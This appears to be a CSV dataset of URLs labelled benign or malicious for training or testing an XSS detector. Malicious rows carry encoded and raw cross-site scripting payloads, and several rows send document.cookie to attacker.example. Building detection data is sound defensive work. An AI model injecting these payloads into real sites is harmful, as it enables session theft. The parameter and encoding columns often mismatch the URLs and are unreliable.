url,payload,carrier,param_name,encoded,notes,label
https://catalog.example/page#test81411,test81411,fragment,,raw,benign,0
https://portal.example.net/api?callback=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&id=1&ref=en,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,callback,redirect,urlencoded,script_in_math,1
https://portal.EXample.neT/search?view=%2527%2529%253Beval%2528String.fromCharCode%252897%252C108%252C101%252C114%252C116%252C40%252C49%252C41%2529%2529%252F%252F&lang=0,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,view,double_urlencoded,eval_obf,1
https://blog.example/redirect?url=https://victim.example/?p=details55825,details55825,redirect,page,raw,benign,0
https://mysite.example/api?callback=profile&id=1,profile,callback,id,raw,benign,0
https://service.test/search?msg=article&page=google,article,query,msg,raw,benign,0
https://testsite.local/search?name=blog3299,blog3299,query,name,raw,benign,0
https://testsite.local/search?page=<body onload=alert(1)>,<body onload=alert(1)>,query,page,raw,body_onload,1
https://service.test/redirect?url=https://victim.example/?p=%25253Cscript%25253Ealert%25281%2529%25253C%252Fscript%25253E&lang=xyz,%3Cscript%3Ealert(1)%3C/script%3E,redirect,query,double_urlencoded,already_encoded,1
https://vulnerable.app/api?callback=javascript:alert(1)&id=1&lang=google,javascript:alert(1),callback,view,html_entity,js_uri,1
https://blog.example/search?q=contact&page=affiliate,contact,query,q,raw,benign,0
https://example.com/search?callback=%253Ciframe%2520src%253D%2527javascript%253Aalert%25281%2529%2527%253E%253C%252Fiframe%253E&utm_source=newsletter,<iframe src='javascript:alert(1)'></iframe>,query,callback,double_urlencoded,iframe_js_uri,1
https://shop.example/search?url=2025-10-01&source=affiliate,2025-10-01,query,url,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p=checkout&utm_source=affiliate,checkout,redirect,query,raw,benign,0
https://webapp.local/search?q=1&lang=affiliate,1,query,q,raw,benign,0
https://catalog.example/search?callback=home&page=0,home,query,callback,raw,benign,0
"https://demo.example.org/api?callback=""><img src=x onerror=alert(1)>&id=1","""><img src=x onerror=alert(1)>",callback,input,raw,attribute_breakout_img,1
https://testsite.local/api?callback=2025-10-01&id=1&utm_source=0,2025-10-01,callback,session,raw,benign,0
https://mysite.example/page#2025-10-01,2025-10-01,fragment,,raw,benign,0
https://webapp.local/search?redirect=home,home,query,redirect,raw,benign,0
https://demo.example.org/page#about,about,fragment,,raw,benign,0
https://mysite.example/search?url=article&lang=organic,article,query,url,raw,benign,0
https://example.com/search?page=category,category,query,page,raw,benign,0
"https://service.test/search?tmpl=""><svg onload=alert(1)>&ref=1","""><svg onload=alert(1)>",query,tmpl,raw,attribute_breakout_svg,1
https://vulnerable.app/user/%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E/profile,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",path,,urlencoded,img_onerror_obf,1
https://webapp.local/search?name=order,order,query,name,raw,benign,0
https://mysite.example/search?search=login,login,query,search,raw,benign,0
https://example.com/search?redirect=%3Cimg%20src%3D1%20onerror%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,redirect,urlencoded,img_onerror_obf,1
https://webapp.local/api?callback=1-ref&id=1,1-ref,callback,input,raw,benign,0
https://mysite.example/search?session=article&source=organic,article,query,session,raw,benign,0
https://testsite.local/api?callback=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>&id=1,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,callback,redirect,raw,script_in_math,1
https://portal.example.net/search?file=%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,file,urlencoded,svg_cdata_script,1
https://webapp.local/search?name=index&ref=organic,index,query,name,raw,benign,0
https://webapp.local/search?redirect=prices&session=organic,prices,query,redirect,raw,benign,0
https://service.test/search?tmpl=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F,');document.location='javascript:alert(1)'//,query,tmpl,urlencoded,document_location_js,1
https://example.com/search?redirect=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,redirect,urlencoded,eval_obf,1
https://webapp.local/search?id=<script>alert(1)</script>&session=xyz,<script>alert(1)</script>,query,id,raw,script_tag,1
https://webapp.local/api?callback=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>&id=1,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,callback,id,raw,svg_cdata_script,1
https://webapp.local/search?callback=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&session=xyz,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,callback,urlencoded,script_in_math,1
https://catalog.example/redirect?url=https://victim.example/?p=item&utm_source=google,item,redirect,q,raw,benign,0
https://service.test/search?term=javascript:alert(1),javascript:alert(1),query,term,raw,js_uri,1
https://vulnerable.app/page#%253Cscript%253Ealert%281%29%253C%2Fscript%253E,%3Cscript%3Ealert(1)%3C/script%3E,fragment,,urlencoded,already_encoded,1
https://demo.example.org/api?callback=<script>alert(1)</script>&id=1,<script>alert(1)</script>,callback,callback,raw,script_tag,1
https://demo.example.org/api?callback=%22%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E&id=1&session=xyz,"""><video><source onerror=alert(1)></video>",callback,redirect,mixed,attribute_breakout_video,1
https://mysite.example/search?view=signup&ref=0,signup,query,view,raw,benign,0
https://webapp.local/search?redirect=2025-10-01&page=newsletter,2025-10-01,query,redirect,raw,benign,0
https://webapp.local/page#%27%29%3Balert%281%29%3B%2F%2F,');alert(1);//,fragment,,urlencoded,inline_js_snippet,1
"https://example.com/redirect?url=https://victim.example/?p=""><img src=x onerror=alert(1)>&utm_source=en","""><img src=x onerror=alert(1)>",redirect,search,raw,attribute_breakout_img,1
https://demo.example.org/user/item3179/profile,item3179,path,,raw,benign,0
https://blog.example/search?session=contact-usr&source=1,contact-usr,query,session,raw,benign,0
https://demo.example.org/user/%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E/profile,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,path,,mixed,svg_cdata_script,1
https://example.com/user/42/profile,42,path,,raw,benign,0
https://portal.example.net/search?name=%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ref=google,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,name,mixed,script_in_math,1
https://webapp.local/search?q=login&lang=affiliate,login,query,q,raw,benign,0
https://webapp.local/search?redirect=order&page=newsletter,order,query,redirect,raw,benign,0
https://service.test/api?callback=%3Cbody%20onload%3Dalert%281%29%3E&id=1&ref=xyz,<body onload=alert(1)>,callback,view,urlencoded,body_onload,1
https://webapp.local/page#%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D,{{constructor.constructor('alert(1)')()}},fragment,,urlencoded,template_injection,1
https://service.test/search?search=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F,');document.location='javascript:alert(1)'//,query,search,urlencoded,document_location_js,1
https://example.com/user/&quot;&gt;&lt;svg onload=alert(1)&gt;/profile,"""><svg onload=alert(1)>",path,,html_entity,attribute_breakout_svg,1
https://demo.example.org/api?callback=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F&id=1,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",callback,callback,urlencoded,eval_obf,1
https://example.com/user/details/profile,details,path,,raw,benign,0
https://webapp.local/search?search=');document.location='javascript:alert(1)'//&ref=en,');document.location='javascript:alert(1)'//,query,search,raw,document_location_js,1
https://service.test/search?q=category&utm_source=1,category,query,q,raw,benign,0
https://webapp.local/search?page=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E&session=google,"""><img src=x onerror=alert(1)>",query,page,double_urlencoded,attribute_breakout_img,1
https://testsite.local/api?callback=%253Cscript%253Efetch%2528%2527http%253A%252F%252Fattacker.example%252Fsteal%253Fc%253D%2527%252Bdocument.cookie%2529%253C%252Fscript%253E&id=1,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,callback,callback,double_urlencoded,cookie_exfil,1
https://testsite.local/search?id=item&lang=1,item,query,id,raw,benign,0
"https://vulnerable.app/search?page=');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//","');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,page,raw,eval_obf,1
https://service.test/search?query=%253Cimg%2520src%253D1%2520onerror%253Dalert%2528String.fromCharCode%252888%252C83%252C83%2529%2529%253E&page=google,"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,query,double_urlencoded,img_onerror_obf,1
https://webapp.local/search?file=1,1,query,file,raw,benign,0
"https://example.com/search?s=""><svg onload=alert(1)>&ref=en","""><svg onload=alert(1)>",query,s,raw,attribute_breakout_svg,1
https://portal.example.net/search?q=test&page=1,test,query,q,raw,benign,0
https://portal.example.net/user/user/profile,user,path,,raw,benign,0
https://webapp.local/search?page=order-usr,order-usr,query,page,raw,benign,0
https://blog.example/user/blog/profile,blog,path,,raw,benign,0
https://catalog.example/search?file=42,42,query,file,raw,benign,0
https://catalog.example/search?term=item,item,query,term,raw,benign,0
https://webapp.local/api?callback=profile-usr&id=1,profile-usr,callback,file,raw,benign,0
https://testsite.local/search?query=article,article,query,query,raw,benign,0
https://blog.example/api?callback=test&id=1&utm_source=newsletter,test,callback,session,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,%3Cscript%3Ealert(1)%3C/script%3E,redirect,name,mixed,already_encoded,1
https://catalog.example/search?page=welcome-usr,welcome-usr,query,page,raw,benign,0
https://shop.example/redirect?url=https://victim.example/?p=contact-2025&session=newsletter,contact-2025,redirect,session,raw,benign,0
https://service.test/search?callback=<body onload=alert(1)>&utm_source=en,<body onload=alert(1)>,query,callback,raw,body_onload,1
https://example.com/redirect?url=https://victim.example/?p=<script>alert(1)</script>&ref=1,<script>alert(1)</script>,redirect,query,raw,script_tag,1
https://example.com/redirect?url=https://victim.example/?p=about,about,redirect,s,raw,benign,0
https://webapp.local/search?utm_source=welcome,welcome,query,utm_source,raw,benign,0
https://testsite.local/search?term=javascript%3Aalert%281%29,javascript:alert(1),query,term,mixed,js_uri,1
https://deMo.exaMPlE.org/user/javascript:alert(1)/profile,javascript:alert(1),path,,html_entity,js_uri,1
https://mysite.example/search?ref=checkout,checkout,query,ref,raw,benign,0
https://shop.example/user/en/profile,en,path,,raw,benign,0
https://portal.example.net/api?callback=index-details&id=1&utm_source=newsletter,index-details,callback,page,raw,benign,0
https://webapp.local/redirect?url=https://victim.example/?p=en,en,redirect,msg,raw,benign,0
https://catalog.example/search?id=index,index,query,id,raw,benign,0
https://service.test/page#%253Cscript%253Efetch%2528%2527http%253A%252F%252Fattacker.example%252Fsteal%253Fc%253D%2527%252Bdocument.cookie%2529%253C%252Fscript%253E,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,fragment,,double_urlencoded,cookie_exfil,1
https://portal.example.net/search?id=details,details,query,id,raw,benign,0
https://catalog.example/redirect?url=https://victim.example/?p=checkout&utm_source=1,checkout,redirect,name,raw,benign,0
https://shop.example/search?name=javascript%253Aalert%25281%2529,javascript:alert(1),query,name,double_urlencoded,js_uri,1
https://webapp.local/api?callback=<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>&id=1,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,callback,callback,raw,meta_refresh_js_uri,1
https://wEbaPp.local/search?tmpl=%27%29%3Bdocument.location%3D%27javascript%3Aalert%281%29%27%2F%2F&page=google,');document.location='javascript:alert(1)'//,query,tmpl,mixed,document_location_js,1
https://vulnerable.app/user/%253Cbody%2520onload%253Dalert%25281%2529%253E/profile,<body onload=alert(1)>,path,,double_urlencoded,body_onload,1
https://shop.example/user/%253Csvg%253E%253Cdesc%253E%253C%2521%255BCDATA%255B%253C%252Fdesc%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%255D%255D%253E%253C%252Fsvg%253E/profile,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,path,,double_urlencoded,svg_cdata_script,1
https://webapp.local/user/42/profile,42,path,,raw,benign,0
https://shop.example/user/product/profile,product,path,,raw,benign,0
https://blog.example/search?file=article&source=affiliate,article,query,file,raw,benign,0
https://service.test/search?name=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,query,name,raw,svg_cdata_script,1
https://demo.example.org/redirect?url=https://victim.example/?p=signup&ref=newsletter,signup,redirect,query,raw,benign,0
https://shop.example/search?search=&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=javascript:alert(1)&#x27;&gt;,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,search,html_entity,meta_refresh_js_uri,1
https://portal.example.net/search?s=user&utm_source=1,user,query,s,raw,benign,0
https://portal.example.net/search?query=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,query,raw,script_in_math,1
"https://testSite.loCAL/search?tmpl=<img src=1 onerror=alert(String.fromCharCode(88,83,83))>&lang=en","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,tmpl,raw,img_onerror_obf,1
https://service.test/search?s=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D,{{constructor.constructor('alert(1)')()}},query,s,mixed,template_injection,1
https://service.test/api?callback=&lt;iframe src=&#x27;javascript:alert(1)&#x27;&gt;&lt;/iframe&gt;&id=1&session=en,<iframe src='javascript:alert(1)'></iframe>,callback,redirect,html_entity,iframe_js_uri,1
"https://demo.example.org/search?term=""><video><source onerror=alert(1)></video>&ref=newsletter","""><video><source onerror=alert(1)></video>",query,term,raw,attribute_breakout_video,1
https://demo.example.org/search?url=blog,blog,query,url,raw,benign,0
https://demo.example.org/page#<body onload=alert(1)>,<body onload=alert(1)>,fragment,,raw,body_onload,1
https://service.test/page#user,user,fragment,,raw,benign,0
https://demo.example.org/user/cart/profile,cart,path,,raw,benign,0
https://demo.example.org/user/%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F/profile,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",path,,urlencoded,eval_obf,1
https://mysite.example/user/checkout/profile,checkout,path,,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p=profile&lang=newsletter,profile,redirect,callback,raw,benign,0
https://shop.example/search?search=about&source=1,about,query,search,raw,benign,0
https://webapp.local/search?redirect=about&utm_source=en,about,query,redirect,raw,benign,0
https://portal.example.net/search?id=%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,query,id,urlencoded,meta_refresh_js_uri,1
https://service.test/search?q=signup,signup,query,q,raw,benign,0
https://testsite.local/search?query=about&session=affiliate,about,query,query,raw,benign,0
https://vulnerable.app/page#%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"""><img src=x onerror=alert(1)>",fragment,,urlencoded,attribute_breakout_img,1
https://webapp.local/search?term=contact&session=1,contact,query,term,raw,benign,0
https://demo.example.org/search?tmpl=%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E&session=xyz,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,tmpl,urlencoded,cookie_exfil,1
https://catalog.example/search?url=home&source=en,home,query,url,raw,benign,0
https://demo.example.org/redirect?url=https://victim.example/?p=profile,profile,redirect,search,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=cart&session=organic,cart,redirect,ref,raw,benign,0
https://catalog.example/page#category,category,fragment,,raw,benign,0
https://vulnerable.app/api?callback=&quot;&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&id=1&utm_source=xyz,"""><video><source onerror=alert(1)></video>",callback,callback,html_entity,attribute_breakout_video,1
https://mysite.example/search?term=home,home,query,term,raw,benign,0
https://example.com/user/prices/profile,prices,path,,raw,benign,0
"https://testsite.local/redirect?url=https://victim.example/?p=""><svg onload=alert(1)>","""><svg onload=alert(1)>",redirect,query,raw,attribute_breakout_svg,1
https://catalog.example/search?q=about&ref=affiliate,about,query,q,raw,benign,0
https://demo.example.org/search?view=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<script>alert(1)</script>,query,view,urlencoded,script_tag,1
https://service.test/page#');document.location='javascript:alert(1)'//,');document.location='javascript:alert(1)'//,fragment,,raw,document_location_js,1
https://webapp.local/search?s=<script>alert(1)</script>,<script>alert(1)</script>,query,s,raw,script_tag,1
https://testsite.local/search?session=signup,signup,query,session,raw,benign,0
https://catalog.example/search?lang=category&page=affiliate,category,query,lang,raw,benign,0
https://testsite.local/search?s=&quot;&gt;&lt;svg onload=alert(1)&gt;,"""><svg onload=alert(1)>",query,s,html_entity,attribute_breakout_svg,1
https://service.test/search?callback=en&utm_source=1,en,query,callback,raw,benign,0
https://demo.example.org/search?file=about,about,query,file,raw,benign,0
https://demo.example.org/search?id=test,test,query,id,raw,benign,0
https://example.com/search?search=contact,contact,query,search,raw,benign,0
https://service.test/api?callback=2025-10-01&id=1,2025-10-01,callback,lang,raw,benign,0
https://mysite.example/search?utm_source=details&source=organic,details,query,utm_source,raw,benign,0
"https://vulnerable.app/search?url=<img src=1 onerror=alert(String.fromCharCode(88,83,83))>&lang=1","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,url,raw,img_onerror_obf,1
https://portal.example.net/user/login/profile,login,path,,raw,benign,0
https://portal.example.net/page#signup,signup,fragment,,raw,benign,0
https://vulnerable.app/api?callback=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D&id=1,{{constructor.constructor('alert(1)')()}},callback,term,urlencoded,template_injection,1
https://portal.example.net/redirect?url=https://victim.example/?p=index&session=1,index,redirect,input,raw,benign,0
https://catalog.example/redirect?url=https://victim.example/?p=welcome-2025,welcome-2025,redirect,redirect,raw,benign,0
https://testsite.local/search?page=signup,signup,query,page,raw,benign,0
https://pOrtal.example.net/page#%3Csvg%3E%3Cdesc%3E%3C%21%5BCDATA%5B%3C%2Fdesc%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%5D%5D%3E%3C%2Fsvg%3E,<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>,fragment,,mixed,svg_cdata_script,1
https://catalog.example/search?page=details,details,query,page,raw,benign,0
https://example.com/page#');document.location='javascript:alert(1)'//,');document.location='javascript:alert(1)'//,fragment,,raw,document_location_js,1
https://webapp.local/page#%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D,{{constructor.constructor('alert(1)')()}},fragment,,mixed,template_injection,1
"https://service.test/search?page=<img src=1 onerror=alert(String.fromCharCode(88,83,83))>","<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",query,page,raw,img_onerror_obf,1
https://Service.Test/user/%3Cmeta%20http-equiv%3D%27refresh%27%20content%3D%270%3Burl%3Djavascript%3Aalert%281%29%27%3E/profile,<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,path,,urlencoded,meta_refresh_js_uri,1
https://demo.example.org/search?file=javascript:alert(1),javascript:alert(1),query,file,raw,js_uri,1
https://example.com/api?callback=%253Cmath%253E%253Cmi%253E%253C%252Fmi%253E%253Cmfrac%253E%253Cmn%253E%253C%252Fmn%253E%253C%252Fmfrac%253E%253C%252Fmath%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&id=1,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,callback,page,double_urlencoded,script_in_math,1
https://vulnerable.app/api?callback=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;&id=1,"""><img src=x onerror=alert(1)>",callback,callback,html_entity,attribute_breakout_img,1
https://testsite.local/api?callback=signup6315&id=1&utm_source=0,signup6315,callback,term,raw,benign,0
https://mysite.example/search?file=category85849&source=0,category85849,query,file,raw,benign,0
https://testsite.local/search?q=category&lang=affiliate,category,query,q,raw,benign,0
https://service.test/search?ref=login,login,query,ref,raw,benign,0
https://webapp.local/search?callback=news,news,query,callback,raw,benign,0
https://mysite.example/redirect?url=https://victim.example/?p=item,item,redirect,redirect,raw,benign,0
https://webapp.local/search?view=test&lang=newsletter,test,query,view,raw,benign,0
https://webapp.local/search?q=test&utm_source=newsletter,test,query,q,raw,benign,0
https://webapp.local/user/prices/profile,prices,path,,raw,benign,0
https://blog.example/search?msg=2025-10-01,2025-10-01,query,msg,raw,benign,0
"https://vulnerable.app/redirect?url=https://victim.example/?p=""><video><source onerror=alert(1)></video>&lang=newsletter","""><video><source onerror=alert(1)></video>",redirect,callback,raw,attribute_breakout_video,1
https://shop.example/search?q=&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mfrac&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mfrac&gt;&lt;/math&gt;&lt;script&gt;alert(1)&lt;/script&gt;&session=google,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,q,html_entity,script_in_math,1
https://blog.example/api?callback=blog&id=1,blog,callback,redirect,raw,benign,0
https://demo.example.org/api?callback=checkout&id=1,checkout,callback,url,raw,benign,0
"https://demo.example.org/search?msg=""><svg onload=alert(1)>","""><svg onload=alert(1)>",query,msg,raw,attribute_breakout_svg,1
https://example.com/search?redirect=order-ref&ref=newsletter,order-ref,query,redirect,raw,benign,0
https://mysite.example/page#cart,cart,fragment,,raw,benign,0
https://service.test/user/%27%29%3Balert%281%29%3B%2F%2F/profile,');alert(1);//,path,,urlencoded,inline_js_snippet,1
https://shop.example/user/%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E/profile,<iframe src='javascript:alert(1)'></iframe>,path,,urlencoded,iframe_js_uri,1
https://blog.example/search?lang=index,index,query,lang,raw,benign,0
https://webapp.local/api?callback=%2527%2529%253Beval%2528String.fromCharCode%252897%252C108%252C101%252C114%252C116%252C40%252C49%252C41%2529%2529%252F%252F&id=1,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",callback,search,double_urlencoded,eval_obf,1
https://portal.example.net/redirect?url=https://victim.example/?p=page,page,redirect,q,raw,benign,0
https://shop.example/search?input=contact-new9366,contact-new9366,query,input,raw,benign,0
https://shop.example/api?callback=login&id=1,login,callback,input,raw,benign,0
https://webapp.local/search?msg=42-x&session=affiliate,42-x,query,msg,raw,benign,0
https://service.test/api?callback=cart-ref&id=1,cart-ref,callback,file,raw,benign,0
https://testsite.local/search?input=news&source=organic,news,query,input,raw,benign,0
"https://testsite.local/user/""><svg onload=alert(1)>/profile","""><svg onload=alert(1)>",path,,raw,attribute_breakout_svg,1
https://testsite.local/api?callback=<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>&id=1,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,callback,callback,raw,script_in_math,1
https://shop.example/page#%3Cmath%3E%3Cmi%3E%3C%2Fmi%3E%3Cmfrac%3E%3Cmn%3E%3C%2Fmn%3E%3C%2Fmfrac%3E%3C%2Fmath%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,fragment,,mixed,script_in_math,1
https://blog.example/search?url=product&ref=newsletter,product,query,url,raw,benign,0
https://shop.example/api?callback=order&id=1&ref=en,order,callback,redirect,raw,benign,0
https://demo.example.org/search?name=test,test,query,name,raw,benign,0
https://service.test/search?page=%22%3E%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,"""><video><source onerror=alert(1)></video>",query,page,mixed,attribute_breakout_video,1
https://demo.example.org/search?callback=about,about,query,callback,raw,benign,0
https://service.test/redirect?url=https://victim.example/?p=user&utm_source=0,user,redirect,q,raw,benign,0
https://Webapp.local/api?callback=javascript%3Aalert%281%29&id=1&session=xyz,javascript:alert(1),callback,callback,urlencoded,js_uri,1
https://blog.example/redirect?url=https://victim.example/?p=user-2025&session=1,user-2025,redirect,q,raw,benign,0
https://blog.example/api?callback=checkout&id=1&page=newsletter,checkout,callback,page,raw,benign,0
https://example.com/search?name=user&ref=en,user,query,name,raw,benign,0
https://demo.example.org/api?callback=cart&id=1,cart,callback,utm_source,raw,benign,0
https://service.test/search?file=&lt;math&gt;&lt;mi&gt;&lt;/mi&gt;&lt;mfrac&gt;&lt;mn&gt;&lt;/mn&gt;&lt;/mfrac&gt;&lt;/math&gt;&lt;script&gt;alert(1)&lt;/script&gt;,<math><mi></mi><mfrac><mn></mn></mfrac></math><script>alert(1)</script>,query,file,html_entity,script_in_math,1
https://testsite.local/redirect?url=https://victim.example/?p=javascript%3Aalert%281%29,javascript:alert(1),redirect,query,urlencoded,js_uri,1
https://service.test/search?msg=checkout,checkout,query,msg,raw,benign,0
https://webapp.local/search?ref=checkout89035,checkout89035,query,ref,raw,benign,0
https://shop.example/search?lang=cart,cart,query,lang,raw,benign,0
https://example.com/user/%27%29%3Balert%281%29%3B%2F%2F/profile,');alert(1);//,path,,urlencoded,inline_js_snippet,1
https://shop.example/redirect?url=https://victim.example/?p=%3Cbody%20onload%3Dalert%281%29%3E&session=xyz,<body onload=alert(1)>,redirect,s,urlencoded,body_onload,1
https://mysite.example/search?input=details&session=affiliate,details,query,input,raw,benign,0
https://testsite.local/search?page=%27%29%3Beval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%2F%2F,"');eval(String.fromCharCode(97,108,101,114,116,40,49,41))//",query,page,urlencoded,eval_obf,1
https://webapp.local/search?callback=about12221,about12221,query,callback,raw,benign,0
https://portal.example.net/redirect?url=https://victim.example/?p=42&ref=1,42,redirect,redirect,raw,benign,0
https://webapp.local/search?url=2025-10-01,2025-10-01,query,url,raw,benign,0
https://blog.example/api?callback=welcome&id=1&source=organic,welcome,callback,input,raw,benign,0
https://example.com/search?input=%3Cscript%3Efetch%28%27http%3A%2F%2Fattacker.example%2Fsteal%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E&lang=en,<script>fetch('http://attacker.example/steal?c='+document.cookie)</script>,query,input,urlencoded,cookie_exfil,1
